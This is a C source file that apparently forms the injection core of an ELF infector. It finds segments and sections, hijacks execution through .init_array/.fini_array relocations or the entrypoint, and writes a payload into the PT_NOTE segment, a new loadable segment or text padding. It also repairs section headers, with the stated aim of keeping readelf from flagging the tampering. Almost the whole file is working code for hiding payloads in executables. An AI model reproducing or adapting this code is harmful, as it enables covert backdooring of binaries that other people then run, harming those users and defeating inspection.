#include "injection.h"



/*
 * Just search for specified segment.
 * Returns a pointer to it.
 */

Elf64_Phdr *
search_segment (binary_t *target, int flags)
{
    Elf64_Phdr *seg_table = target->segments;
    Elf64_Phdr *last_segm = target->segments;

    for (int8_t i = 0; i < target->head->e_phnum; seg_table++, i++)
    {
        /* Search for the last PT_LOAD entry.
        Usually the Data segment */
        if (flags == ANY && seg_table->p_type == PT_LOAD)
        {
            if (seg_table->p_vaddr > last_segm->p_vaddr)
                    last_segm = seg_table;
        }

        // Search for Text segment. Usually the one pointed by entrypoint.
        if (flags == TXT && seg_table->p_type == PT_LOAD)
        {
            if ( target->head->e_entry >= seg_table->p_vaddr &&
                    target->head->e_entry < (seg_table->p_vaddr + seg_table->p_filesz))
                    return seg_table;
        }

        // Search for Dynamic segment.
        if (flags == DYN && seg_table->p_type == PT_DYNAMIC)
                return seg_table;

        //Search for the data segment. Usually the one with RW permissions.
        if (flags == DATA && seg_table->p_type == PT_LOAD)
        {
            if (seg_table->p_flags == (PF_R | PF_W))
                    return seg_table;
        }

        //Search for the Note entry
        if (flags == NOTE && seg_table->p_type == PT_NOTE)
                return seg_table;
    }

    return (flags != ANY) ? NULL : last_segm;
}




/*
 * .init_array or .fini_array:
 * Overwrite frame_dummy's pointer.
 *
 * If it fails, then just good ol' entrypoint to payload.
 */

void
set_entrypoint (binary_t *target, uint64_t payload_addr)
{
    void *p_init            = NULL;
    Elf64_Shdr *init_array  = NULL;
    Elf64_Shdr *ptr_rela    = NULL;
    Elf64_Rela *rela        = NULL;
    char * start_section    = NULL;

    if (global_flags & THREAD)
            start_section = ".init_array";
    else
            start_section = ".fini_array";

    if ((init_array = search_section(target, start_section)) == NULL)
    {
        fprintf(stderr, "Section %s not found\n", start_section);
        goto basic;
    }

    if (target->head->e_type == ET_DYN)
    {
        if ((ptr_rela = search_section(target, ".rela.dyn")) == NULL)
        {
            fprintf(stderr, "Section .rela.dyn not found\n");
            goto basic;
        }

        p_init = (void *) init_array->sh_addr;
        rela = (Elf64_Rela *) (target->mem + ptr_rela->sh_offset);

        //loop through .rela.dyn and search for frame_dummy's entry
        for (uint32_t i = 0; i < (ptr_rela->sh_size / sizeof(Elf64_Rela)); i++)
        {
            if (p_init == (void *)rela[i].r_offset)
            {
                rela[i].r_addend = (int64_t)payload_addr; //overwrite it
                return;
            }
        }

        goto basic;
    }

    //overwrite frame_dummy's entry in init_array
    p_init = (void *)(target->mem + init_array->sh_offset);
    memcpy(p_init, &payload_addr, 8);

    return;

basic:
    puts("[**] Switching to basic entrypoint overwrite");
    target->head = (Elf64_Ehdr *)target->mem;
    target->head->e_entry = payload_addr;
}




/*
 * Search for the specified section.
 * If the target binary is stripped, try with an alternative method.
 */

Elf64_Shdr *
search_section (binary_t *target, char *sec_name)
{
    if (!(global_flags & STRIPPED))
    {
        Elf64_Shdr *shdr = (Elf64_Shdr *) (target->mem + target->head->e_shoff);
        void *strtable   = (void *) (target->mem + shdr[target->head->e_shstrndx].sh_offset);
        char *name       = NULL;

        for (uint32_t i = 0; i < target->head->e_shnum; i++)
        {
            name = (char *) strtable + shdr[i].sh_name;
            if (!strncmp(name, sec_name, strlen(sec_name)))
                    return shdr+i;
        }
    }

    // If the binary has been stripped, then its time for PLAN B :D
    // The dynamic segment holds information about a lot of sections.
    Elf64_Phdr *p_dynamic = search_segment(target, DYN);
    if (p_dynamic != NULL)
    {
        Elf64_Dyn  *dyn   = (Elf64_Dyn*)(p_dynamic->p_offset + target->mem);
        Elf64_Shdr *fake  = calloc(sizeof(Elf64_Shdr), 1); //Create a fake section
        while (dyn->d_tag != DT_NULL)
        {
           if ((dyn->d_tag == DT_INIT_ARRAY && !strcmp(sec_name, ".init_array")) ||
               (dyn->d_tag == DT_FINI_ARRAY && !strcmp(sec_name, ".fini_array")))
           {
               Elf64_Phdr *data = search_segment(target, DATA);
               fake->sh_addr = dyn->d_un.d_ptr;
               fake->sh_offset = (target->head->e_type == ET_DYN)? dyn->d_un.d_ptr :
                               (data->p_offset & 0xfffffff00000) | (dyn->d_un.d_ptr & 0xfffff); //Provisional
               return fake;
           }

           if (dyn->d_tag == DT_RELA && !strcmp(sec_name, ".rela.dyn"))
           {
               Elf64_Phdr *txt = search_segment(target, TXT);
               fake->sh_addr   = dyn->d_un.d_ptr;
               fake->sh_offset = (target->head->e_type == ET_DYN)? dyn->d_un.d_ptr :
                               (txt->p_offset & 0xfffffff00000) | (dyn->d_un.d_ptr & 0xfffff); //Provisional
               dyn++; //The next entry holds the size of rela.dyn section
               fake->sh_size   = dyn->d_un.d_val;
               return fake;
           }
           dyn++;
        }
    }

    return NULL;
}




/*
 * After an injection, in order to not call for attention,
 * the sections must be repaired, so tools such as readelf don't
 * show any warnings.
 */

void
repair_sections (binary_t *target, size_t data_size, size_t data_size2, size_t offset)
{
    Elf64_Shdr *shdr = (Elf64_Shdr *) (target->mem + target->head->e_shoff);

    for (uint32_t i = 0; i < target->head->e_shnum; i++)
    {
        //If there's a section after our newly injected payload,
        //increase its offset.
         if (shdr[i].sh_offset > offset)
                shdr[i].sh_offset += data_size;

         //Find the section in which we have injected the payload
         //and increase its size.
         if (data_size2 > 0 && shdr[i].sh_offset < offset)
         {
             if ((shdr[i].sh_offset + shdr[i].sh_size) >= offset)
                    shdr[i].sh_size += data_size2;
         }
    }

    //Golang's ELF bin have the Section Header Table at the beginning
    if (offset < target->head->e_shoff)
            target->head->e_shoff += data_size;
}




/*
 * Simple error handling function
 */

void
err_handler (binary_t *exec, binary_t *payload, char *err)
{
    fprintf(stderr,"Error: %s\n", err);
    fflush(stderr);

    munmap(exec->mem, (size_t)exec->st.st_size);
    munmap(payload->mem, (size_t)payload->st.st_size);

    close(exec->fd);
    close(payload->fd);

    exit(EXIT_FAILURE);
}




/*
 * Create a new ELF Program Header entry.
 * It will point at the last PT_LOAD segment, where we
 * will inject the payload.
 */

Elf64_Phdr *
new_segment (binary_t *target, binary_t *payload)
{
    Elf64_Phdr *last    = NULL;
    Elf64_Phdr *new     = NULL;

    if ((last = search_segment(target, ANY)) == NULL)
    {
        fprintf(stderr, "%s last PT_LOAD segment not found\n", target->name);
        return NULL;
    }

    if ((new = (Elf64_Phdr*) calloc(sizeof(Elf64_Phdr), 1)) == NULL)
    {
        perror("Failed to allocate memory");
        return NULL;
    }

    new->p_type     = PT_LOAD;
    new->p_filesz   = (size_t)payload->st.st_size;
    new->p_memsz    = (size_t)payload->st.st_size;
    new->p_offset   = last->p_offset + last->p_filesz;
    new->p_flags    = (global_flags & ELF)? PF_R | PF_W : PF_R | PF_X;
    new->p_align    = last->p_align;
    new->p_vaddr    = (last->p_vaddr + last->p_filesz);

    //Segment p_vaddr must be aligned against p_offset and p_align
    while (new->p_vaddr < (last->p_vaddr + last->p_memsz)) new->p_vaddr += new->p_align;

    new->p_paddr    = new->p_vaddr;

    return new;
}




/*
 * ELF Text segment padding injection.
 * Inject the stub at the end of the text segment.
 * Stub max-size = PAGE_SIZE
 */

uint8_t *
inject_stage1 (binary_t *final, binary_t *stage1, size_t *bin_size)
{
    *bin_size           += PAGE_SIZE;
    uint8_t *temp_mem   = NULL;
    Elf64_Phdr *text    = NULL;
    size_t end_text_off = 0;

    temp_mem = mmap(NULL, *bin_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (temp_mem == MAP_FAILED)
    {
        perror("ERROR MMAP");
        exit(EXIT_FAILURE);
    }

    final->head         =  (Elf64_Ehdr *)final->mem;
    final->segments     =  (Elf64_Phdr*)(final->head->e_phoff + final->mem);
    text                =  search_segment(final, TXT);
    end_text_off        =  text->p_offset + text->p_filesz;
    final_entryp        =  text->p_vaddr + text->p_memsz; //Final entrypoint for the stub
    text->p_memsz       += (size_t)stage1->st.st_size; //Increase segment size
    text->p_filesz      += (size_t)stage1->st.st_size;

    // Increase the offset of every segment after the injected code.
    for (int8_t i = 0; i < final->head->e_phnum; i++)
    {
        if (final->segments[i].p_vaddr > (text->p_vaddr + text->p_filesz))
                final->segments[i].p_offset += PAGE_SIZE;
    }

    // Increase the offset of every section after the injected code.
    repair_sections(final, PAGE_SIZE, (size_t)stage1->st.st_size, end_text_off);

    memcpy(temp_mem, final->mem, end_text_off);
    memcpy(temp_mem + end_text_off, stage1->mem, (size_t)stage1->st.st_size);
    memcpy(temp_mem + end_text_off + PAGE_SIZE, final->mem + end_text_off,
            (*bin_size - PAGE_SIZE - end_text_off));


    puts("[**] OK - Stub injected\n");
    return temp_mem;
}




/*
 * If the payload fits inside the real Note segment,
 * overwrite the content.
 */

uint64_t
small_payload (Elf64_Phdr *Note, uint8_t *mem, binary_t *target, binary_t *payload)
{
    puts("[**] Overwriting PT_NOTE segment");

    memcpy(mem, target->mem, Note->p_offset); //Copy before payload
    memcpy(mem + Note->p_offset, payload->mem, (size_t)payload->st.st_size); //Inject the payload
    memcpy(mem + Note->p_offset + (size_t)payload->st.st_size, //Copy after payload
            target->mem + Note->p_offset + (size_t)payload->st.st_size,
            (size_t)target->st.st_size - (Note->p_offset + (size_t)payload->st.st_size));

    return Note->p_vaddr;
}




/*
 * If the payload is bigger than the Note segment,
 * append it as a new segment and modify the
 * Note's program header entry to point at the payload.
 */

uint64_t
big_payload (Elf64_Phdr *Note, uint8_t *mem, binary_t *target, binary_t *payload)
{
    puts("[**] Appending payload as a new segment");

    Elf64_Phdr * new = NULL;

    if ((new = new_segment(target, payload)) == NULL)
            err_handler(target, payload, "Failed to create a new segment");

    if (target->head->e_shoff > 0)
            repair_sections(target, (size_t)payload->st.st_size, 0, new->p_offset);

    memcpy(Note, new, target->head->e_phentsize); //set new Note's program header entry
    memcpy(mem, target->mem, new->p_offset); //Copy before payload
    memcpy(mem + new->p_offset, payload->mem, (size_t)payload->st.st_size); //Inject the payload
    memcpy(mem + new->p_offset + new->p_filesz,
            target->mem + new->p_offset, (size_t)target->st.st_size - new->p_offset); //Copy after payload

    return new->p_vaddr;
}




/*
 * Injector wrapper
 */

uint8_t *
inject_payload (binary_t target, binary_t payload, size_t *bin_size)
{
    Elf64_Phdr *Note    = NULL;
    *bin_size           = (size_t)(target.st.st_size + payload.st.st_size);
    uint8_t * temp_mem  = NULL;

    temp_mem = mmap(NULL, *bin_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (temp_mem == MAP_FAILED)
    {
        perror("ERROR MMAP");
        exit(EXIT_FAILURE);
    }

    if ((Note = search_segment(&target, NOTE)) == NULL)
            err_handler(&target, &payload, "PT_NOTE segment not found");

    if (Note->p_filesz >= (size_t)payload.st.st_size)
            final_entryp = small_payload(Note, temp_mem, &target, &payload);
    else
            final_entryp = big_payload(Note, temp_mem, &target, &payload);

    puts("[**] OK - Payload injected");
    return temp_mem;
}
